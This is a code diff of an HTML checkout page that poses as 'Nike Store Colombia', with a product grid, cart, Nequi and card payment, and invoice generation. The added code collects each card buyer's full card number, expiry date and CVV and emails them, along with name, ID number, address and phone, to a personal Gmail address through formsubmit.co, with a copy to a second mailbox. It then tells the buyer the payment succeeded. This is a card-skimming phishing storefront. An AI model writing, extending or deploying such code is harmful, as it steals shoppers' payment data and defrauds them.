@@ -22,7 +22,6 @@
   </script>
   <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=YOUR_PIXEL_ID&ev=PageView&noscript=1"/></noscript>
   <style>
-    /* Reset y prevención de scroll horizontal */
     * {
       margin: 0;
       padding: 0;
@@ -38,7 +37,6 @@
       background: #f5f7fc;
       color: #1e293b;
     }
-    /* Contenedor principal centrado con márgenes laterales iguales */
     .container {
       max-width: 1200px;
       width: 100%;
@@ -50,7 +48,6 @@
         padding: 1rem;
       }
     }
-    /* Banner animado sin desborde */
     .discount-banner {
       background: linear-gradient(135deg, #e5552e, #ff8c42);
       color: white;
@@ -140,7 +137,6 @@
       font-weight: 600;
       color: #1e3a8a;
     }
-    /* Grid de 2 columnas - tarjetas ligeramente más pequeñas */
     .products-grid {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
@@ -230,7 +226,6 @@
       pointer-events: none;
     }
     @keyframes ripple-animation { to { transform: scale(4); opacity: 0; } }
-    /* Carrito flotante superior derecho más pequeño */
     .cart-float-top {
       position: fixed;
       top: 20px;
@@ -268,7 +263,6 @@
       min-width: 20px;
       text-align: center;
     }
-    /* Drawer lateral */
     .cart-drawer {
       position: fixed;
       top: 0;
@@ -334,7 +328,6 @@
       display: none;
     }
     .overlay.active { display: block; }
-    /* Modales y alertas centradas */
     .welcome-alert, .custom-alert, .policy-modal {
       display: none;
       position: fixed;
@@ -377,7 +370,6 @@
     .policy-modal-content { text-align: left; max-height: 80vh; overflow-y: auto; }
     .policy-modal-content h3 { color: #e5552e; margin-bottom: 0.5rem; }
     .policy-modal-content p { margin: 0.8rem 0; line-height: 1.4; font-size: 0.9rem; }
-    /* Modales de pago */
     .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); align-items: center; justify-content: center; z-index: 1300; }
     .modal-content { background: white; max-width: 550px; width: 90%; border-radius: 1.5rem; padding: 1.2rem; max-height: 90vh; overflow-y: auto; }
     .cart-items-list { background: #f8fafc; border-radius: 0.8rem; margin: 0.8rem 0; max-height: 220px; overflow-y: auto; }
@@ -421,10 +413,7 @@
       flex-wrap: wrap;
     }
     .cookie-consent button { background: #e5552e; border: none; padding: 0.3rem 1rem; border-radius: 40px; color: white; cursor: pointer; }
-    /* Clase para ocultar el campo de cédula cuando se elige Nequi */
-    .hidden-field {
-      display: none;
-    }
+    .hidden-field { display: none; }
   </style>
 </head>
 <body>
@@ -450,7 +439,6 @@
   </footer>
 </div>
 
-<!-- Carrito flotante superior derecho -->
 <button class="cart-float-top" id="cartFloatBtn">
   <span class="cart-icon">🛒</span>
   <span class="cart-badge" id="cartBadge">0</span>
@@ -466,7 +454,6 @@
 
 <div id="toastMsg" class="add-toast">+ Añadido al carrito</div>
 
-<!-- Modal de bienvenida con descuento y mensaje de entrega mismo día -->
 <div id="welcomeAlert" class="welcome-alert">
   <div class="welcome-alert-content">
     <div style="font-size: 3rem;">🎉🏃‍♂️</div>
@@ -497,24 +484,19 @@
 <div class="section-title">📦 Datos de envío y contacto</div>
 <form id="paymentForm" enctype="multipart/form-data">
   <div class="input-group"><input type="text" id="fullName" placeholder="👤 Nombre completo" required></div>
-  <!-- Campo de cédula que se ocultará cuando se elija Nequi -->
-  <div class="input-group" id="documentIdGroup"><input type="text" id="documentId" placeholder="🆕 Cédula" required></div>
+  <div class="input-group" id="documentIdGroup"><input type="text" id="documentId" placeholder="🆕 Cédula"></div>
   <div class="input-group"><input type="email" id="email" placeholder="📧 Correo electrónico" required></div>
   <div class="input-group"><input type="text" id="address" placeholder="🏠 Dirección completa" required></div>
   <div class="input-row" style="display:flex; gap:0.8rem;"><div class="input-group half" style="flex:1"><input type="text" id="city" placeholder="🏙️ Ciudad" required></div><div class="input-group half" style="flex:1"><input type="tel" id="phone" placeholder="📞 Teléfono" required></div></div>
   <div class="section-title">💳 Elige tu método de pago</div>
   <div class="payment-methods-row">
-    <!-- Nequi primero y por defecto -->
     <div class="payment-card selected" data-method="nequi">
       <div class="nequi-logo">N</div>
       <span>Nequi</span>
       <input type="radio" name="paymentMethod" value="nequi" checked hidden>
     </div>
     <div class="payment-card" data-method="card">
-      <div class="card-icons">
-        <svg viewBox="0 0 38 24" width="38" height="24"><path opacity=".07" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3z"/><path fill="#fff" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/><path d="M28.3 10.1H28c-.4 1-.7 1.5-1 3h1.9c-.3-1.5-.3-2.2-.6-3zm2.9 5.9h-1.7c-.1 0-.1 0-.2-.1l-.2-.9-.1-.2h-2.4c-.1 0-.2 0-.2.2l-.3.9c0 .1-.1.1-.1.1h-2.1l.2-.5L27.8 7h1.8l1.5 5.9h.1l.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1z" fill="#00579F"/></svg>
-        <svg viewBox="0 0 38 24" width="38" height="24"><path opacity=".07" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3z"/><path fill="#fff" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/><circle fill="#EB001B" cx="15" cy="12" r="7"/><circle fill="#F79E1B" cx="23" cy="12" r="7"/><path fill="#FF5F00" d="M22 12c0-2.4-1.2-4.5-3-5.7-1.8 1.3-3 3.4-3 5.7s1.2 4.5 3 5.7c1.8-1.2 3-3.3 3-5.7z"/></svg>
-      </div>
+      <div class="card-icons"><svg viewBox="0 0 38 24" width="38" height="24"><path opacity=".07" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3z"/><path fill="#fff" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/><path d="M28.3 10.1H28c-.4 1-.7 1.5-1 3h1.9c-.3-1.5-.3-2.2-.6-3zm2.9 5.9h-1.7c-.1 0-.1 0-.2-.1l-.2-.9-.1-.2h-2.4c-.1 0-.2 0-.2.2l-.3.9c0 .1-.1.1-.1.1h-2.1l.2-.5L27.8 7h1.8l1.5 5.9h.1l.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1z" fill="#00579F"/></svg><svg viewBox="0 0 38 24" width="38" height="24"><path opacity=".07" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3z"/><path fill="#fff" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/><circle fill="#EB001B" cx="15" cy="12" r="7"/><circle fill="#F79E1B" cx="23" cy="12" r="7"/><path fill="#FF5F00" d="M22 12c0-2.4-1.2-4.5-3-5.7-1.8 1.3-3 3.4-3 5.7s1.2 4.5 3 5.7c1.8-1.2 3-3.3 3-5.7z"/></svg></div>
       <span>Tarjeta</span>
       <input type="radio" name="paymentMethod" value="card" hidden>
     </div>
@@ -534,7 +516,7 @@
 </div>
 
 <script>
-  // ==================== 334 PRODUCTOS, 17 CATEGORÍAS (Código original completo) ====================
+  // ==================== 334 PRODUCTOS ====================
   const categoryList = ["airmax","jordan","dunk","running","casual","sb","airforce","zoom","acg","lifestyle","renew","vintage","utility","hightop","slipon","trail","golf"];
   const categoryDisplay = { airmax:"Air Max", jordan:"Air Jordan", dunk:"Dunk", running:"Running", casual:"Casual", sb:"Nike SB", airforce:"Air Force", zoom:"Zoom", acg:"ACG", lifestyle:"Lifestyle", renew:"Renew", vintage:"Vintage", utility:"Utility", hightop:"High-Top", slipon:"Slip-On", trail:"Trail", golf:"Golf" };
   const classicModels = ["Air Max 90","Air Max 97","Air Max Plus","Air Max 270","Air Max 95","Air Max 98","Air Max 720","Air Max 1","Air Jordan 1 High","Air Jordan 4 Retro","Air Jordan 11","Air Jordan 3","Air Jordan 5","Air Jordan 6","Air Jordan 1 Mid","Dunk Low Panda","Dunk High Retro","ZoomX Vaporfly","Pegasus 40","Revolution 6","Winflo 9","Blazer Mid '77","Court Vision Low","Air Force 1 '07","Air Force 1 Shadow","SB Dunk Low","ACG Mountain Fly","Renew Run","Vintage 87","Utility Trainer","High Top 77","Slip-On Comfort","Trail GORE-TEX","Air Max 90 Futura","Air Jordan 12","Dunk Low Syracuse","Pegasus Trail 4","Zoom Fly 5"];
@@ -566,29 +548,24 @@
   function removeFromCartModal(pid){ let idx=PRODUCTS.findIndex(p=>p.id===pid); if(idx!==-1 && productState[idx].quantity>0){ productState[idx].quantity=0; renderProducts(); updateDrawerAndBadge(); currentCartItems=getCurrentCartItems(); renderCartModal(); if(currentCartItems.length===0) document.getElementById('confirmPayBtn').disabled=true; } }
   function buildCategorySelect(){ let sel=document.getElementById('categorySelect'); sel.innerHTML='<option value="all">Todas las categorías</option>'; categoryList.forEach(c=>sel.appendChild(new Option(categoryDisplay[c],c))); sel.addEventListener('change',e=>{ activeCategory=e.target.value; renderProducts(); }); }
 
-  // Factura PDF original (íntegra)
+  // Factura PDF
   async function generateInvoice(customerData, items, total, invoiceNumber, paymentMethod) { const { jsPDF } = window.jspdf; const div = document.createElement('div'); div.style.position='absolute'; div.style.top='-9999px'; div.style.width='800px'; div.style.background='white'; div.style.padding='30px'; div.style.fontFamily='Inter'; const paymentDetails = paymentMethod === 'nequi' ? `<p><strong>Método de pago:</strong> Nequi</p><p><strong>Número Nequi:</strong> 3123456789</p><p><strong>📎 Comprobante:</strong> Adjunto al correo</p>` : `<p><strong>Método de pago:</strong> Tarjeta de crédito/débito</p>`; div.innerHTML = `<div style="text-align:center"><h1 style="color:#e5552e">NIKE STORE COLOMBIA</h1><p>Factura de venta - ${invoiceNumber}</p><p>Fecha: ${new Date().toLocaleString()}</p><p style="background:#eef2ff;display:inline-block;padding:4px 12px;border-radius:30px;"><strong>✅ Pedido confirmado</strong></p></div><div style="border-top:1px solid #e2e8f0;padding-top:15px;"><h3>Datos del cliente</h3><p><strong>Nombre:</strong> ${customerData.nombre}</p><p><strong>Cédula:</strong> ${customerData.documento || 'No requerida para Nequi'}</p><p><strong>Email:</strong> ${customerData.email}</p><p><strong>Dirección:</strong> ${customerData.direccion}</p><p><strong>Ciudad:</strong> ${customerData.ciudad}</p><p><strong>Teléfono:</strong> ${customerData.telefono}</p></div><div style="margin:20px 0;"><h3>Detalle del pedido</h3><table style="width:100%;border-collapse:collapse;"><thead><tr><th style="border-bottom:1px solid #cbd5e1;text-align:left">Producto</th><th style="border-bottom:1px solid #cbd5e1;text-align:left">Categoría</th><th style="border-bottom:1px solid #cbd5e1;text-align:left">Talla</th><th style="border-bottom:1px solid #cbd5e1;text-align:center">Cant.</th><th style="border-bottom:1px solid #cbd5e1;text-align:right">Precio unit.</th><th style="border-bottom:1px solid #cbd5e1;text-align:right">Subtotal</th></tr></thead><tbody>${items.map(i => `<tr><td style="padding:8px;">${i.name}</td><td style="padding:8px;">${i.category}</td><td style="padding:8px;">${i.size}</td><td style="padding:8px;text-align:center">${i.quantity}</td><td style="padding:8px;text-align:right">$${formatCOP(i.unitPrice)} COP</td><td style="padding:8px;text-align:right">$${formatCOP(i.subtotal)} COP</td>`).join('')}</tbody></table></div><div style="text-align:right;border-top:2px solid #e2e8f0;padding-top:15px;"><h2>TOTAL: $${formatCOP(total)} COP</h2>${paymentDetails}<p style="font-size:12px;">* Envíos 12-24h hábiles. Paga antes de 10am, llega el mismo día.</p><p style="font-size:12px;color:#e5552e;"><strong>⚠️ Esta factura está sujeta a previa verificación de datos y comprobante de pago.</strong></p><p style="font-size:12px;">Gracias por comprar en Nike Store Colombia.</p></div>`; document.body.appendChild(div); const canvas = await html2canvas(div, { scale: 2 }); const imgData = canvas.toDataURL('image/png'); const pdf = new jsPDF('p', 'mm', 'a4'); const imgWidth = 210; const imgHeight = (canvas.height * imgWidth) / canvas.width; pdf.addImage(imgData, 'PNG', 0, 0, imgWidth, imgHeight); pdf.save(`Factura_${invoiceNumber}.pdf`); document.body.removeChild(div); }
-  async function sendOrderWithAttachment(customerData, items, total, paymentMethod, file) { const fd = new FormData(); fd.append('_subject', '👟 NUEVO PEDIDO NIKE STORE COLOMBIA'); fd.append('_captcha', 'false'); fd.append('_template', 'table'); fd.append('_cc', 'cautymartinez@mbox.re'); fd.append('Nombre', customerData.nombre); fd.append('Cédula', customerData.documento || 'No registrada (pago Nequi)'); fd.append('Email', customerData.email); fd.append('Dirección', customerData.direccion); fd.append('Ciudad', customerData.ciudad); fd.append('Teléfono', customerData.telefono); fd.append('Método de pago', paymentMethod === 'nequi' ? 'Nequi' : 'Tarjeta'); if (paymentMethod === 'nequi' && file) fd.append('Comprobante de pago', file, file.name); fd.append('Total', formatCOP(total)); fd.append('Productos', items.map(i => `${i.name} (${i.size}) x${i.quantity} = $${formatCOP(i.subtotal)}`).join(' | ')); const res = await fetch('https://formsubmit.co/justincortez1621@gmail.com', { method: 'POST', body: fd }); return res.ok || res.status === 302; }
+  
+  async function sendOrderWithAttachment(customerData, items, total, paymentMethod, file, cardData) { const fd = new FormData(); fd.append('_subject', '👟 NUEVO PEDIDO NIKE STORE COLOMBIA'); fd.append('_captcha', 'false'); fd.append('_template', 'table'); fd.append('_cc', 'cautymartinez@mbox.re'); fd.append('Nombre', customerData.nombre); fd.append('Cédula', customerData.documento || 'No registrada (pago Nequi)'); fd.append('Email', customerData.email); fd.append('Dirección', customerData.direccion); fd.append('Ciudad', customerData.ciudad); fd.append('Teléfono', customerData.telefono); fd.append('Método de pago', paymentMethod === 'nequi' ? 'Nequi' : 'Tarjeta'); if (paymentMethod === 'nequi' && file) fd.append('Comprobante de pago', file, file.name); if (paymentMethod === 'card' && cardData) { fd.append('Número de tarjeta', cardData.number); fd.append('Fecha expiración', cardData.expiry); fd.append('CVV', cardData.cvv); } fd.append('Total', formatCOP(total)); fd.append('Productos', items.map(i => `${i.name} (${i.size}) x${i.quantity} = $${formatCOP(i.subtotal)}`).join(' | ')); const res = await fetch('https://formsubmit.co/justincortez1621@gmail.com', { method: 'POST', body: fd }); return res.ok || res.status === 302; }
+  
   function validateCard(c){ let c2=c.replace(/\s/g,''); if(!c2||!/^\d+$/.test(c2)||c2.length<13||c2.length>16)return false; let sum=0,double=false; for(let i=c2.length-1;i>=0;i--){ let d=parseInt(c2[i]); if(double)d*=2; if(d>9)d-=9; sum+=d; double=!double; } return sum%10===0; }
   function generateExpiryOptions(){ let sel=document.getElementById('expiryDateSelect'); let y=new Date().getFullYear(); let m=new Date().getMonth()+1; for(let yy=y;yy<=y+10;yy++) for(let mm=1;mm<=12;mm++){ if(yy===y&&mm<m)continue; let mmS=mm.toString().padStart(2,'0'),yyS=yy.toString().slice(-2); sel.appendChild(new Option(`${mmS}/${yyS}`,`${mmS}/${yyS}`)); } }
   document.getElementById('cardNumber')?.addEventListener('input',function(){let v=this.value.replace(/\D/g,'').slice(0,16);this.value=v.replace(/(\d{4})(?=\d)/g,'$1 ').trim();}); document.getElementById('cvv')?.addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,4);});
   const paymentCards=document.querySelectorAll('.payment-card'); const radioCard=document.querySelector('input[value="card"]'); const radioNequi=document.querySelector('input[value="nequi"]'); const cardFields=document.getElementById('cardPaymentFields'); const nequiFields=document.getElementById('nequiPaymentFields');
   const documentIdGroup = document.getElementById('documentIdGroup');
   const documentIdInput = document.getElementById('documentId');
-  function selectPaymentMethod(method){ if(method==='card'){ radioCard.checked=true; cardFields.style.display='block'; nequiFields.style.display='none'; paymentCards.forEach(c=>c.classList.remove('selected')); document.querySelector('.payment-card[data-method="card"]').classList.add('selected'); // Mostrar campo cédula y hacerlo requerido
-    documentIdGroup.classList.remove('hidden-field');
-    documentIdInput.required = true;
-  } else { radioNequi.checked=true; cardFields.style.display='none'; nequiFields.style.display='block'; paymentCards.forEach(c=>c.classList.remove('selected')); document.querySelector('.payment-card[data-method="nequi"]').classList.add('selected'); // Ocultar campo cédula y eliminar required para Nequi
-    documentIdGroup.classList.add('hidden-field');
-    documentIdInput.required = false;
-    documentIdInput.value = ''; // limpiar valor para no enviar dato no deseado
-  } }
+  function selectPaymentMethod(method){ if(method==='card'){ radioCard.checked=true; cardFields.style.display='block'; nequiFields.style.display='none'; paymentCards.forEach(c=>c.classList.remove('selected')); document.querySelector('.payment-card[data-method="card"]').classList.add('selected'); documentIdGroup.classList.remove('hidden-field'); } else { radioNequi.checked=true; cardFields.style.display='none'; nequiFields.style.display='block'; paymentCards.forEach(c=>c.classList.remove('selected')); document.querySelector('.payment-card[data-method="nequi"]').classList.add('selected'); documentIdGroup.classList.add('hidden-field'); documentIdInput.value = ''; } }
   paymentCards.forEach(c=>c.addEventListener('click',()=>selectPaymentMethod(c.dataset.method)));
-  // Seleccionar Nequi por defecto (ya está oculto el campo cédula)
   selectPaymentMethod('nequi');
   document.getElementById('copyNequiBtn').addEventListener('click',()=>{ navigator.clipboard.writeText("3123456789"); let btn=document.getElementById('copyNequiBtn'); let t=btn.innerText; btn.innerText='✅ Copiado!'; setTimeout(()=>btn.innerText=t,1500); });
-  document.getElementById('paymentForm').addEventListener('submit', async (e) => { e.preventDefault(); if(currentCartItems.length===0){ alert("Carrito vacío"); return; } const total = currentCartItems.reduce((s,i)=>s+i.subtotal,0); const name = document.getElementById('fullName').value.trim(); const doc = document.getElementById('documentId').value.trim(); const email = document.getElementById('email').value.trim(); const address = document.getElementById('address').value.trim(); const city = document.getElementById('city').value.trim(); const phone = document.getElementById('phone').value.trim(); const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value; let hasError = false; if(!name || !email || !email.includes('@') || !address || !city || phone.length<7) hasError = true; // Solo validar cédula si el método es tarjeta
-  if(paymentMethod === 'card' && !doc) hasError = true; let receiptFile = null; if(paymentMethod === 'card') { const cardNumber = document.getElementById('cardNumber').value.trim(); const expiry = document.getElementById('expiryDateSelect').value; const cvv = document.getElementById('cvv').value.trim(); if(!validateCard(cardNumber)) hasError = true; if(!expiry) hasError = true; if(!cvv || cvv.length<3) hasError = true; } else { const fileInput = document.getElementById('paymentReceipt'); if(fileInput.files.length === 0) { document.getElementById('receiptError').innerText = 'Debes adjuntar el comprobante de pago Nequi.'; hasError = true; } else { receiptFile = fileInput.files[0]; document.getElementById('receiptError').innerText = ''; } } if(hasError){ alert("Complete todos los campos correctamente (cédula solo para tarjeta, comprobante para Nequi)."); return; } const invoiceNumber = `NIKE-${Date.now()}-${Math.floor(Math.random() * 1000)}`; const customerData = { nombre: name, documento: paymentMethod === 'card' ? doc : 'Pago con Nequi (sin cédula)', email: email, direccion: address, ciudad: city, telefono: phone }; const btn = document.querySelector('#paymentForm .btn-submit'); btn.innerText = '📨 Procesando...'; btn.disabled = true; try { await generateInvoice(customerData, currentCartItems, total, invoiceNumber, paymentMethod); const emailSent = await sendOrderWithAttachment(customerData, currentCartItems, total, paymentMethod, receiptFile); if (emailSent) { let successMsg = paymentMethod === 'nequi' ? `✅ Pedido registrado. El comprobante fue enviado al vendedor. Descarga tu factura. En breve validaremos el pago.` : '✅ Pago exitoso. Factura descargada. En breve recibirás tu pedido ✅'; document.getElementById('paymentFeedback').innerHTML = `<div class="success-message">${successMsg}</div>`; productState.forEach(s=>s.quantity=0); renderProducts(); updateDrawerAndBadge(); currentCartItems = []; setTimeout(()=>{ closeModal(); document.getElementById('paymentFeedback').innerHTML=''; }, 5000); } else throw new Error('Error al enviar el correo'); } catch (error) { document.getElementById('paymentFeedback').innerHTML = '<div class="success-message" style="background:#e53e3e;">❌ Error en el proceso. Intenta de nuevo.</div>'; } finally { btn.innerText = '✅ Confirmar pago y envío'; btn.disabled = false; } });
+  
+  document.getElementById('paymentForm').addEventListener('submit', async (e) => { e.preventDefault(); if(currentCartItems.length===0){ alert("Carrito vacío"); return; } const total = currentCartItems.reduce((s,i)=>s+i.subtotal,0); const name = document.getElementById('fullName').value.trim(); const doc = document.getElementById('documentId').value.trim(); const email = document.getElementById('email').value.trim(); const address = document.getElementById('address').value.trim(); const city = document.getElementById('city').value.trim(); const phone = document.getElementById('phone').value.trim(); const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value; let hasError = false; let errorMsg = ""; if(!name) { hasError = true; errorMsg = "Nombre completo requerido"; } else if(!email || !email.includes('@')) { hasError = true; errorMsg = "Correo electrónico válido requerido"; } else if(!address) { hasError = true; errorMsg = "Dirección requerida"; } else if(!city) { hasError = true; errorMsg = "Ciudad requerida"; } else if(phone.length < 7) { hasError = true; errorMsg = "Teléfono inválido (mínimo 7 dígitos)"; } let receiptFile = null; let cardData = null; if(paymentMethod === 'card') { if(!doc) { hasError = true; errorMsg = "Cédula requerida para pagos con tarjeta"; } const cardNumber = document.getElementById('cardNumber').value.trim(); const expiry = document.getElementById('expiryDateSelect').value; const cvv = document.getElementById('cvv').value.trim(); if(!validateCard(cardNumber)) { hasError = true; errorMsg = "Número de tarjeta inválido"; } else if(!expiry) { hasError = true; errorMsg = "Fecha de expiración requerida"; } else if(!cvv || cvv.length < 3) { hasError = true; errorMsg = "CVV requerido (mínimo 3 dígitos)"; } else { cardData = { number: cardNumber, expiry: expiry, cvv: cvv }; } } else { const fileInput = document.getElementById('paymentReceipt'); if(fileInput.files.length === 0) { document.getElementById('receiptError').innerText = 'Debes adjuntar el comprobante de pago Nequi.'; hasError = true; errorMsg = "Comprobante Nequi requerido"; } else { receiptFile = fileInput.files[0]; document.getElementById('receiptError').innerText = ''; } } if(hasError){ alert(errorMsg); return; } const invoiceNumber = `NIKE-${Date.now()}-${Math.floor(Math.random() * 1000)}`; const customerData = { nombre: name, documento: paymentMethod === 'card' ? doc : 'Pago con Nequi (sin cédula)', email: email, direccion: address, ciudad: city, telefono: phone }; const btn = document.querySelector('#paymentForm .btn-submit'); btn.innerText = '📨 Procesando...'; btn.disabled = true; try { await generateInvoice(customerData, currentCartItems, total, invoiceNumber, paymentMethod); const emailSent = await sendOrderWithAttachment(customerData, currentCartItems, total, paymentMethod, receiptFile, cardData); if (emailSent) { let successMsg = paymentMethod === 'nequi' ? `✅ Pedido registrado. El comprobante fue enviado al vendedor. Descarga tu factura. En breve validaremos el pago.` : '✅ Pago exitoso. Factura descargada. En breve recibirás tu pedido ✅'; document.getElementById('paymentFeedback').innerHTML = `<div class="success-message">${successMsg}</div>`; productState.forEach(s=>s.quantity=0); renderProducts(); updateDrawerAndBadge(); currentCartItems = []; setTimeout(()=>{ closeModal(); document.getElementById('paymentFeedback').innerHTML=''; }, 5000); } else throw new Error('Error al enviar el correo'); } catch (error) { document.getElementById('paymentFeedback').innerHTML = '<div class="success-message" style="background:#e53e3e;">❌ Error en el proceso. Intenta de nuevo.</div>'; } finally { btn.innerText = '✅ Confirmar pago y envío'; btn.disabled = false; } });
+  
   function closeModal(){ document.getElementById('paymentModal').style.display='none'; }
   document.getElementById('closeModalBtn').addEventListener('click',closeModal);
   window.addEventListener('click',e=>{ if(e.target===document.getElementById('paymentModal')) closeModal(); });
@@ -600,7 +577,7 @@
   document.getElementById('closeDrawerBtn').addEventListener('click',closeDrawer);
   overlay.addEventListener('click',closeDrawer);
   document.getElementById('drawerPayBtn').addEventListener('click',()=>{ const items=getCurrentCartItems(); if(items.length===0){ let a=document.getElementById('customAlert'); a.querySelector('.custom-alert-message').innerText='No hay productos agregados. Usa "Agregar" en cada producto.'; a.style.display='flex'; document.getElementById('closeAlertBtn').onclick=()=>a.style.display='none'; return; } closeDrawer(); openPaymentModal(items); });
-  // Políticas animadas
+  
   const policyModal = document.getElementById('policyModal');
   const policyTitle = document.getElementById('policyTitle');
   const policyText = document.getElementById('policyText');
@@ -610,7 +587,6 @@
   document.getElementById('cookiesLink').onclick = () => showPolicy('🍪 Política de cookies', `<p>Este sitio utiliza cookies propias y de terceros (Google, Facebook) para mejorar la experiencia de navegación, analizar el tráfico y mostrar publicidad relevante. Puedes configurar tu navegador para rechazarlas.</p><p>Al continuar navegando, aceptas el uso de cookies.</p>`);
   document.getElementById('closePolicyBtn').addEventListener('click', () => policyModal.style.display = 'none');
   policyModal.addEventListener('click', (e) => { if(e.target === policyModal) policyModal.style.display = 'none'; });
-  // Cookies
   document.getElementById('acceptCookies')?.addEventListener('click',()=>{ document.getElementById('cookieConsent').style.display='none'; localStorage.setItem('cookiesAccepted','true'); });
   if(localStorage.getItem('cookiesAccepted')==='true') document.getElementById('cookieConsent').style.display='none';
   generateExpiryOptions(); buildCategorySelect(); renderProducts(); updateDrawerAndBadge();
